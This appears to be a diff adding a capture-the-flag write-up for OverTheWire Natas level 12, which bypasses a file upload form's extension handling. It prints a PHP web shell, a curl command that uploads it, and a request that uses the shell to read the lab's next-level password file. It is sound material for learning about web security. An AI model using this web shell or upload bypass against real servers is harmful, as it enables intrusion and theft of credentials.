@@ -1,0 +1,65 @@
+Level 12
+--------
+
+This time, we have a file upload form. Let's take a look at the code
+that processes input.
+
+Let's walk through this code:
+
+  - We start with a `genRandomString` function, which appears to
+    create a 10-character random string.
+  - Then, we send a directory and an extension to the `makeRandomPath`,
+    which creates a random filename (using the extension provided)
+    until the filename is not in use.
+  - We also create a `makeRandomPathFromFilename` function which takes
+    in a directory and a filename, and extracts the extension from the
+    filename. Then it uses this information to call `makeRandomPath`.
+  - Then the PHP code checks to see if a file has been uploaded, and
+    then creates a random path from the provided filename. Then it
+    checks the size to make sure it's under 1000 bytes, and if these
+    checks pass, it uploads the file and tells us where it is.
+
+Let's ses if we can upload some PHP code, and have it get executed.
+
+An important thing to notice about the source code is where the script
+retrieves the original filename from. We can see that it is not the
+provided filename, but rather the `filename` parameter hidden in the
+form. This parameter contains a random string followed by a `.jpg`
+extension. So, tentatively we can see that unless we can intercept and
+change this value before it is received by the server, we will not be
+able to (easily) execute PHP code.
+
+Let's take a look at exactly what data we can control, and how it
+winds up after the script executes to see if we can upload a PHP file,
+have it maintain its extension, and allow us to browse to it.
+
+ 1. Original file containing our PHP code. The server calls this `randomString.jpg`
+ 2. Change the filename to `shell.php` before it reaches the server.
+ 3. Server receives the file.
+ 4. `MakeRandomPathFromFilename("upload", "shell.php");`
+ 5. `$ext = '.php';`
+ 6. `MakeRandomPath("upload", "php");`
+ 7. returns "upload/new_random_string.php"
+ 8. Link to that file is provided to us.
+ 9. When we visit that link, Apache will see `.php` and execute it for us. How helpful!
+
+How's this for an exploit payload?
+
+     <?php
+     // Rudimentary Shell
+     passthru($_GET['cmd']);
+     ?>
+
+So, after examining the file upload form, we can use curl to POST our data:
+
+    curl -u natas12:... \
+        -F MAX_FILE_SIZE=1000 \
+        -F filename=pwnd.php \
+        -F "uploadedfile=@shell.php" \
+        http://natas12.natas.labs.overthewire.org/index.php
+
+Now we use the URL it returned, with `?cmd=cat%20/etc/natas_webpass/natas13`:
+
+    curl -u natas12:... \
+        "http://natas12.natas.labs.overthewire.org/upload/krgtfuwc2f.php?cmd=cat%20/etc/natas_webpass/natas13"
+    ...
